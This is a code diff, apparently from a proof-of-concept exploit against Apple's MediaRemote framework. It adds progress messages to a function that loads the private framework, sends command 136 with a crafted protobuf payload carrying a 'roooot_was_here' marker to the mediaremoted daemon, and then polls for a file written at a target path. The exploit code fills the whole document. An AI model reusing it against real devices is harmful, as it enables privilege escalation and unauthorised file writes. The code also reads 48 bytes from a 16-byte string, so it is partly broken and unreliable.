@@ -30,22 +30,31 @@ static NSData *tagged_field(int field, NSData *payload) {
 }
 
 // writes successfully but cleanup deletes file after...
-int dd_write(const char *identifier, const char *targetPath) {
+int dd_write(const char *identifier, const char *targetPath, dd_progress_t progress) {
+    void (^step)(NSString *) = ^(NSString *msg) {
+        if (!progress) return;
+        dispatch_async(dispatch_get_main_queue(), ^{ progress(msg); });
+    };
+
+    step(@"1/5: dlopen MediaRemote");
     dlopen("/System/Library/PrivateFrameworks/MediaRemote.framework/MediaRemote", RTLD_NOW);
 
     typedef void (^res)(NSDictionary *);
     typedef void (*send_fn)(NSInteger, NSDictionary *, dispatch_queue_t, res);
 
+    step(@"2/5: dlsym MRMediaRemoteSendCommand");
     send_fn fn = (send_fn)dlsym(RTLD_DEFAULT, "MRMediaRemoteSendCommand");
-    if (!fn) return 1;
+    if (!fn) { step(@"2/5: FAILED — symbol not found"); return 1; }
 
+    step(@"3/5: build protobuf payload");
     NSData *marker = [NSData dataWithBytes:"roooot_was_here\n" length:48];
-
     NSMutableData *proto = [NSMutableData dataWithData:tagged_field(1, marker)];
     [proto appendData:tagged_field(2, [[NSString stringWithUTF8String:identifier] dataUsingEncoding:NSUTF8StringEncoding])];
 
+    step(@"4/5: send command 136 to mediaremoted");
     fn(136, @{ @"kMRMediaRemoteOptionPlaybackSessionData": proto }, dispatch_get_main_queue(), ^(NSDictionary *r){});
 
+    step(@"5/5: polling for file…");
     for (int i = 0; i < 3000000; i++) {
         struct stat st;
 
@@ -55,13 +64,16 @@ int dd_write(const char *identifier, const char *targetPath) {
             ssize_t n = fd >= 0 ? read(fd, buf, sizeof(buf) - 1) : 0;
             if (fd >= 0) close(fd);
 
-            // Report what we found regardless of uid
-            printf("(dd) found: uid=%d gid=%d mode=%o size=%lld\n",
-                   st.st_uid, st.st_gid, st.st_mode & 07777, (long long)st.st_size);
+            step([NSString stringWithFormat:@"5/5: found! uid=%d size=%lld", st.st_uid, (long long)st.st_size]);
+            printf("(dd) found: uid=%d gid=%d mode=%o size=%lld\n", st.st_uid, st.st_gid, st.st_mode & 07777, (long long)st.st_size);
             if (n > 0) printf("(dd) content: %s", buf);
             return 0;
         }
+
+        if (i > 0 && i % 1000000 == 0)
+            step([NSString stringWithFormat:@"5/5: polling… %dM iters", i / 1000000]);
     }
 
+    step(@"5/5: timeout — file never appeared");
     return 1;
 }
